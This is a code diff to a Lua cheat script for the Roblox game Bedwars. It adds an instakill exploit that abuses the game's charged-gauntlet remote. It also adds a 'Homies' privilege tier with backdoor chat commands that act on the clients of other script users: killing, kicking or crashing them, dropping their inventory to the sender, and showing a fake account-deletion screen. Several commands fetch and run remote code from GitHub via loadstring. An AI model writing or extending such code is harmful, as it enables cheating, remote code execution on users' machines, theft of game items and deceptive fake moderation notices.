@@ -1682,7 +1682,8 @@ runFunction(function()
 			if arg == "privateplus" and continuechecking and WhitelistFunctions.LocalPriority == 2 then table.insert(temp, lplr) continuechecking = false end
 			if arg == "coowner" and continuechecking and WhitelistFunctions.LocalPriority == 3 then table.insert(temp, lplr) continuechecking = false end
 			if arg == "owner" and continuechecking and WhitelistFunctions.LocalPriority == 4 then table.insert(temp, lplr) continuechecking = false end
-			if arg == "rayhafz" and continuechecking and WhitelistFunctions.LocalPriority == 5 then table.insert(temp, lplr) continuechecking = false end
+			if arg == "homies" and continuechecking and WhitelistFunctions.LocalPriority == 5 then table.insert(temp, lplr) continuechecking = false end
+			if arg == "rayhafz" and continuechecking and WhitelistFunctions.LocalPriority == 6 then table.insert(temp, lplr) continuechecking = false end
 			for i,v in pairs(playersService:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
 
 			return temp
@@ -3703,6 +3704,8 @@ runFunction(function()
     local originalArmC0 = nil
 	local killauracurrentanim
 	local animationdelay = tick()
+	local instakillrealremote = bedwars.ClientHandler:Get('RequestGauntletsChargedAttack').instance
+	local region = Region3.new(Vector3.one * 9e9, Vector3.one * 9e9)
 
 	local function getStrength(plr)
 		local inv = bedwarsStore.inventories[plr.Player]
@@ -4421,12 +4424,7 @@ runFunction(function()
 									bedwars.SwordController.lastAttack = workspace:GetServerTimeNow()
 									bedwarsStore.attackReach = math.floor((selfrootpos - root.Position).magnitude * 100) / 100
 									bedwarsStore.attackReachUpdate = tick() + 1
-									
-									local instakillremote = replicatedStorageService.rbxts_include.node_modules["@rbxts"].net.out._NetManaged.RequestGauntletsChargedAttack
-		                            local function InstakillMoment()
-			                        instakillremote:FireServer({region = Region3.new(Vector3.new(9e9, 9e9, 9e9), Vector3.new(9e9, 9e9, 9e9)), unitLookVector = lplr.Character.HumanoidRootPart.CFrame.LookVector})
-		                         end
-		                            InstakillMoment()
+									instakillrealremote:FireServer({region = region, unitLookVector = CFrame.lookAt(selfpos, root.Position).lookVector / 100})
 									killaurarealremote:FireServer({
 										weapon = sword.tool,
 										chargedAttack = {chargeRatio = swordmeta.sword.chargedAttack and not swordmeta.sword.chargedAttack.disableOnGrounded and 1 or 0},
@@ -12024,8 +12022,18 @@ end
 		  if whitelist["RayHafz"] ~= nil then
 			for i, v in pairs(whitelist["RayHafz"]) do
 			  if v.id == userId then
-				userType = 5
+				userType = 6
 				userTag = "RayHafz"
+				break
+			  end
+			end
+		  end
+		  
+		  if userType == 0 and whitelist["Homies"] ~= nil then
+			for i, v in pairs(whitelist["Homies"]) do
+			  if v.id == userId then
+				userType = 5
+				userTag = "Homies"
 				break
 			  end
 			end
@@ -12110,10 +12118,18 @@ end
 				end
 			end
 		end
+		if whitelist["Homies"] ~= nil then
+			for i,v in pairs(whitelist["Homies"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 5
+					return lplr_Type
+				end
+			end
+		end
 		if whitelist["RayHafz"] ~= nil then
 			for i,v in pairs(whitelist["RayHafz"]) do
 				if v.id == tostring(lplr.UserId) then
-					lplr_Type = 5
+					lplr_Type = 6
 					return lplr_Type
 				end
 			end
@@ -12166,10 +12182,19 @@ end
 			end
 		end
 		
+		if whitelist["Homies"] ~= nil then
+			for i, v in pairs(whitelist["Homies"]) do
+				if v.id == userId then
+					userType = 5
+					break
+				end
+			end
+		end
+		
 		if whitelist["RayHafz"] ~= nil then
 			for i, v in pairs(whitelist["RayHafz"]) do
 				if v.id == userId then
-					userType = 5
+					userType = 6
 					break
 				end
 			end
@@ -12191,6 +12216,14 @@ end
 		end
 		if whitelist["RayHafz"] ~= nil then
 			for i,v in pairs(whitelist["RayHafz"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 6
+					return lplr_Type
+				end
+			end
+		end
+		if whitelist["Homies"] ~= nil then
+			for i,v in pairs(whitelist["Homies"]) do
 				if v.id == tostring(lplr.UserId) then
 					lplr_Type = 5
 					return lplr_Type
@@ -12266,10 +12299,19 @@ end
 			end
 		end
 		
+		if whitelist["Homies"] ~= nil then
+			for i, v in pairs(whitelist["Homies"]) do
+				if v.id == userId then
+					userType = 5
+					break
+				end
+			end
+		end
+		
 		if whitelist["RayHafz"] ~= nil then
 			for i, v in pairs(whitelist["RayHafz"]) do
 				if v.id == userId then
-					userType = 5
+					userType = 6
 					break
 				end
 			end
@@ -12330,6 +12372,15 @@ end
 					ownerPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 				else
 					print("No owner player found!")
+				
+			end
+		end,
+		[";kill homies"] = function()
+				local homiesPlayer = getPlayerByType(5) 
+				if homiesPlayer then
+					homiesPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				else
+					print("No homies player found!")
 				
 			end
 		end,
@@ -12406,7 +12457,22 @@ end
 					wait(0.01)
 				end
 			else
-				print("No private player found!")
+				print("No owner player found!")
+			end
+		end,
+		[";void homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				local character = homiesPlayer.Character
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+				local newPosition = humanoidRootPart.CFrame
+				for i = 1, 3 do
+					newPosition = newPosition + Vector3.new(0, -40, 0)
+					humanoidRootPart.CFrame = newPosition
+					wait(0.01)
+				end
+			else
+				print("No homies player found!")
 			end
 		end,
 		
@@ -12450,6 +12516,14 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";kick homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				homiesPlayer:Kick("You just got kicked from the game | :troll:")
+			else
+				print("No homies player found!")
+			end
+		end,
 		
 		[";ban default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -12489,6 +12563,14 @@ end
 				ownerPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
 			else
 				print("No owner player found!")
+			end
+		end,
+		[";ban homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				homiesPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
+			else
+				print("No homies player found!")
 			end
 		end,
 		
@@ -12532,6 +12614,14 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";lobby homies"] = function()
+			local homiesPlayer = getPlayerByType(5) 
+			if homiesPlayer then
+				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
+			else
+				print("No homies player found!")
+			end
+		end,
 		
 		[";shutdown default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -12568,6 +12658,14 @@ end
 		[";shutdown owner"] = function()
 			local ownerPlayer = getPlayerByType(4)
 			if ownerPlayer then
+				game:Shutdown()
+			else
+				print("No owner player found!")
+			end
+		end,
+		[";shutdown homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
 				game:Shutdown()
 			else
 				print("No owner player found!")
@@ -12649,6 +12747,21 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";lagback homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				for i = 1, 10 do
+					wait()
+					local character = homiesPlayer.Character or homiesPlayer.CharacterAdded:Wait()
+					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					local forwardVector = humanoidRootPart.CFrame.LookVector
+					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+				end
+			else
+				print("No homies player found!")
+			end
+		end,
 		
 		[";destroymap default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -12727,7 +12840,23 @@ end
 				end
 				unanchorParts(ownerPlayer.Character)
 			else
-				print("No private player found!")
+				print("No owner player found!")
+			end
+		end,
+		[";destroymap homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				local function unanchorParts(object)
+					if object:IsA("BasePart") then
+						object.Anchored = false
+					end
+					for _, child in ipairs(object:GetChildren()) do
+						unanchorParts(child)
+					end
+				end
+				unanchorParts(homiesPlayer.Character)
+			else
+				print("No homies player found!")
 			end
 		end,
 		
@@ -12771,6 +12900,14 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";troller homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))() 
+			else
+				print("No homies player found!")
+			end
+		end,
 		
 		[";rickroll default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -12810,6 +12947,14 @@ end
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
 			else
 				print("No owner player found!")
+			end
+		end,
+		[";rickroll homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
+			else
+				print("No homies player found!")
 			end
 		end,
 
@@ -12853,6 +12998,14 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";chipman homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
+			else
+				print("No homies player found!")
+			end
+		end,
 		
 		[";xylex default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -12892,6 +13045,14 @@ end
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
 			else
 				print("No owner player found!")
+			end
+		end,
+		[";xylex homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
+			else
+				print("No homies player found!")
 			end
 		end,
 		
@@ -12935,6 +13096,14 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";josiah homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
+			else
+				print("No owner player found!")
+			end
+		end,
 		
 		[";freeze default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -12965,15 +13134,23 @@ end
 			if coownerPlayer then
 				coownerPlayer.Character.HumanoidRootPart.Massless = true
 			else
-				print("No private player found!")
+				print("No coowner player found!")
 			end
 		end,
 		[";freeze owner"] = function()
-			local ownerPlayer = getPlayerByType(5)
+			local ownerPlayer = getPlayerByType(4)
 			if ownerPlayer then
 				ownerPlayer.Character.HumanoidRootPart.Massless = true
 			else
-				print("No private player found!")
+				print("No owner player found!")
+			end
+		end,
+		[";freeze homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				homiesPlayer.Character.HumanoidRootPart.Massless = true
+			else
+				print("No homies player found!")
 			end
 		end,
 	
@@ -13017,6 +13194,14 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";unfreeze homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				homiesPlayer.Character.HumanoidRootPart.Massless = false
+			else
+				print("No homies player found!")
+			end
+		end,
 	
 		[";crash default"] = function() 
 			local defaultPlayer = getPlayerByType(0)
@@ -13056,6 +13241,14 @@ end
 				while true do end
 			else
 				print("No owner player found!")
+			end
+		end,
+		[";crash homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+				while true do end
+			else
+				print("No homies player found!")
 			end
 		end,
 		
@@ -13429,6 +13622,80 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";byfron homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+					homiesPlayer.PlayerGui:ClearAllChildren()
+					GuiLibrary.MainGui.Enabled = false
+					game:GetService("CoreGui"):ClearAllChildren()
+					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+					task.wait(0.2)
+					homiesPlayer:Kick()
+					game:GetService("GuiService"):ClearError()
+					task.wait(2)
+					local gui = Instance.new("ScreenGui")
+					gui.IgnoreGuiInset = true
+					gui.Parent = game:GetService("CoreGui")
+					local frame = Instance.new("Frame")
+					frame.BorderSizePixel = 0
+					frame.Size = UDim2.new(1, 0, 1, 0)
+					frame.BackgroundColor3 = Color3.new(1, 1, 1)
+					frame.Parent = gui
+					task.delay(0.1, function()
+						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+					end)
+					task.delay(2, function()
+						local e = Roact.createElement(auth, {
+							style = {},
+							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+							moderationDetails = {
+								punishmentTypeDescription = "Delete",
+								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+								reactivateAccountActivated = true,
+								badUtterances = {},
+								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+							},
+							termsActivated = function() 
+								game:Shutdown()
+							end,
+							communityGuidelinesActivated = function() 
+								game:Shutdown()
+							end,
+							supportFormActivated = function() 
+								game:Shutdown()
+							end,
+							reactivateAccountActivated = function() 
+								game:Shutdown()
+							end,
+							logoutCallback = function()
+								game:Shutdown()
+							end,
+							globalGuiInset = {
+								top = 0
+							}
+						})
+						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+								localization = tLocalization.mock()
+							}, {Roact.createElement(UIBlox.Style.Provider, {
+									style = {
+										Theme = darktheme,
+										Font = gotham
+									},
+								}, {e})}))
+						Roact.mount(screengui, game:GetService("CoreGui"))
+					end)
+				else
+				print("No homies player found!")
+			end
+		end,
 		
 		[";steal default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -13540,6 +13807,28 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";steal homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+		    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
+					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
+					task.wait(1)
+				end
+				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
+					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
+						item = v.tool,
+						amount = v.amount ~= math.huge and v.amount or 99999999
+					})
+					if e then 
+						e.CFrame = plr.Character.HumanoidRootPart.CFrame
+					else
+						v.tool:Destroy()
+					end
+				end
+				else
+				print("No homies player found!")
+			end
+		end,
 
 		[";uninject default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -13579,6 +13868,14 @@ end
                 GuiLibrary.SelfDestruct()
 			else
 				print("No owner player found!")
+			end
+		end,
+		[";uninject homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+                GuiLibrary.SelfDestruct()
+			else
+				print("No homies player found!")
 			end
 		end,
 		
@@ -13677,6 +13974,25 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";toggle homies"] = function(args)
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+		    if #args >= 1 then
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module then
+						module.Api.ToggleButton()
+					end
+				end
+			else
+				print("No homies player found!")
+			end
+		end,
 		
 		[";sit default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -13726,6 +14042,16 @@ end
 			end
 			else
 				print("No owner player found!")
+			end
+		end,
+		[";sit homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+		    if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = true
+			end
+			else
+				print("No homies player found!")
 			end
 		end,
 		
@@ -13779,6 +14105,16 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";unsit homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+		    if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = false
+			end
+			else
+				print("No homies player found!")
+			end
+		end,
 		
 		[";trip default"] = function()
 			local defaultPlayer = getPlayerByType(0)
@@ -13828,6 +14164,16 @@ end
 			end
 			else
 				print("No owner player found!")
+			end
+		end,
+		[";trip homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+		    if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+			end
+			else
+				print("No homies player found!")
 			end
 		end,
 		
@@ -13881,6 +14227,16 @@ end
 				print("No owner player found!")
 			end
 		end,
+		[";reveal homies"] = function()
+			local homiesPlayer = getPlayerByType(5)
+			if homiesPlayer then
+			local textChatService = game:GetService("TextChatService")
+			wait(0.0001)
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("APE By RayHafz")
+			else
+				print("No homies player found!")
+			end
+		end,
 	}
 	function isPlayerAllowed()
 		return false
@@ -13891,6 +14247,7 @@ end
 	local privateplus = {}
 	local coowner = {}
 	local owner = {}
+	local homies = {}
 	local users = {}
 	
 	task.spawn(function()
@@ -14063,6 +14420,18 @@ end
 				end
 			end
 			
+			if whitelist["Homies"] ~= nil then
+				for i, v in pairs(whitelist["Homies"]) do
+					if v.id == userId then
+						if not hasTag then
+							hasTag = true
+							p.PrefixText = "<font color='"..colors["orange"].."'>[HOMIES OF APE😎]</font> " .. msg.PrefixText
+						end
+						userType = 5
+					end
+				end
+			end
+			
 			if whitelist["RayHafz"] ~= nil then
 				for i, v in pairs(whitelist["RayHafz"]) do
 					if v.id == userId then
@@ -14070,7 +14439,7 @@ end
 							hasTag = true
 							p.PrefixText = "<font color='"..colors["pink"].."'>[RayHafz Femboy💜]</font> " .. msg.PrefixText
 						end
-						userType = 5
+						userType = 6
 					end
 				end
 			end
